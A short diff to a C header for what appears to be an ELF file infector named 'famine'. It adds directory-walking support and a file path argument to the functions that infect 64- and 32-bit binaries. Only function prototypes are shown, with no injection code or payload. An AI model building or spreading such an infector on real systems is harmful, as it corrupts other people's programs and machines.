@@ -18,6 +18,7 @@
 # include <sys/stat.h>
 # include <elf.h>
 # include <stdbool.h>
+# include <dirent.h>
 
 typedef enum e_arch
 {
@@ -64,8 +65,9 @@ void    usage(void);
 bool    check_file_arch(t_binary *binary);
 void    open_binary_in_memory(const char *binary_file, t_binary *binary);
 void    *ft_calloc(size_t nb, size_t mem);
-int     infects_64(t_binary *binary);
-int     infects_32(t_binary *binary);
+int     infects_64(t_binary *binary, char *full_path);
+int     infects_32(t_binary *binary, char *full_path);
 bool    build_stub(t_famine *p, const unsigned char *stub, size_t stub_len);
-
+int     file_handler(char *path);
+char    *build_path(char *path, char *filename);
 #endif
